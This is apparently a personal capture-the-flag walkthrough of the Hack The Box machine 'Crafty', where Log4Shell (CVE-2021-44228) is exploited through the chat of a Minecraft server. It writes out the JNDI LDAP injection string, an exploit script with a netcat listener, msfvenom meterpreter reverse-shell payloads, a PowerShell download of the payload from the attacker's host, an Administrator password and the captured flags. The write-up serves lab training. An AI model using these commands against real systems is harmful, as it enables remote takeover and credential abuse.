
Vulnerability: CVE-2021-44228 (Minecraft)




Crafty Overall path towards gaining user:
1. Download TLauncher from https://tlauncher.org/jar
2. Clone this https://github.com/kozmer/log4j-shell-poc , change poc.py line 26 from String cmd="/bin/sh"; to String cmd="cmd.exe";
3. Download JDK 8: wget -c --no-cookies --no-check-certificate --header "Cookie: oraclelicense=accept-securebackup-cookie" https://download.oracle.com/otn/java/jdk...x64.tar.gz
4. Execute log4j exploit like: python3 poc.py --userip [Your VPN IP] --webport 8000 --lport 9001 (Remember to open nc listener on port 9001)
5. When ex 
6. Using JDK 8 run the TLauncher, jar file and select the Fabric 1.16.5 from Version and install it. After installation run the Game. Press T for chat and enter: ${jndi:ldap://your vpn ip:1389/a}. You should receive rev shell as svc_minecraft (User Flag Owned) 
   
   https://breachforums.cx/Thread-HTB-Crafty
   
   
# IMG
![[Pasted image 20240309144937.png]]

   
   
Add Server
![[Pasted image 20240309145213.png]]
![[Pasted image 20240309234035.png]]![[Pasted image 20240309234106.png]]
![[Pasted image 20240310001816.png]]

![[Pasted image 20240310003232.png]]

![[Pasted image 20240310003354.png]]

![[Pasted image 20240310003432.png]]
![[Pasted image 20240310003533.png]]






IP 
10.10.11.249



└─$ sudo nmap -sT -sV crafty.htb           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 15:40 EST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.034s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds
                                                               

ALL PORT

┌──(kali㉿kali)-[~/Machine]
└─$ sudo nmap -sT -sV -p- crafty.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 15:52 EST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.036s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


Start the TLauncher
┌──(kali㉿kali)-[~/Machine/Crafty/log4j-shell-poc]
└─$ ./jdk1.8.0_20/bin/java -jar /home/kali/Downloads/TLauncher-2.895.jar  

Setup Listener
python3 poc.py --userip 10.10.16.98 --webport 80 --lport 4444
nc -nlvp 4444

version Fabric 1.16.5

Connect the server to the listener type this in game server chat (Press T)

${jndi:ldap://10.10.16.98:1389/a}


Found User flag
c:\Users\svc_minecraft>cd Desktop
cd Desktop

c:\Users\svc_minecraft\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C419-63F6

 Directory of c:\Users\svc_minecraft\Desktop

02/05/2024  06:02 AM    <DIR>          .
02/05/2024  06:02 AM    <DIR>          ..
03/08/2024  04:16 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,523,616,768 bytes free

c:\Users\svc_minecraft\Desktop>more usert.txt
more usert.txt
Cannot access file C:\Users\svc_minecraft\Desktop\usert.txt

c:\Users\svc_minecraft\Desktop>more user.txt 
more user.txt
2aba9772865ac1ab21ec3764bba43658

c:\Users\svc_minecraft\Desktop>








System information 

c:\Users\svc_minecraft>systeminfo                                                                                     
systeminfo                                                                                                            
                                                                                                                      
Host Name:                 CRAFTY                                                                                     
OS Name:                   Microsoft Windows Server 2019 Standard                                                     
OS Version:                10.0.17763 N/A Build 17763                                                                 
OS Manufacturer:           Microsoft Corporation                                                                      
OS Configuration:          Standalone Server                                                                          
OS Build Type:             Multiprocessor Free                                                                        
Registered Owner:          Windows User                                                                               
Registered Organization:                                                                                              
Product ID:                00429-00521-62775-AA944                                                                    
Original Install Date:     4/10/2020, 9:48:06 AM                                                                      
System Boot Time:          3/8/2024, 4:15:57 PM                                                                       
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,071 MB
Virtual Memory: Max Size:  4,902 MB
Virtual Memory: Available: 2,768 MB
Virtual Memory: In Use:    2,134 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\CRAFTY                                        
Hotfix(s):                 N/A                                             
Network Card(s):           1 NIC(s) Installed.                             
                           [01]: vmxnet3 Ethernet Adapter                  
                                 Connection Name: Ethernet0                                                                                            
                                 DHCP Enabled:    No                       
                                 IP address(es)                            
                                 [01]: 10.10.11.249                        
                                 [02]: fe80::16e9:912b:c6e2:e027                                                                                       
                                 [03]: dead:beef::ab03:8159:2fb9:c141                                                                                  
                                 [04]: dead:beef::1be              





msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=10.10.16.98 LPORT=8989 -o /home/kali/Machine/Crafty/reverse.exe

powershell

Invoke-WebRequest -Uri "http://10.10.16.98:8000/r
everse.exe" -OutFile "C:\users\svc_minecraft\Desktop\rev.exe"  


msfconsole
  use multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set lhost tun0
  set lport 8989
    run


    download playercounter-1.0_SNAPSHOT.jar



    install http://java-decompiler.github.io to decopile the .jar file 


Reverse shell admin  access

$SecPass = ConvertTo-SecureString "s67u84zKq8IXw" -AsPlainText 
-Force

$cred = New-Object System.Management.Automation.PSCredential('A
dministrator', $SecPass)


PWD 
s67u84zKq8IXw

second reverse shell 
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=8990 -f exe >> rev2.exe

secondo msfconsole 


Runas 
https://github.com/antonioCoco/RunasCs/releases



Root Flag 
63e2d80fb9ba9c1d204d842acf8914e1


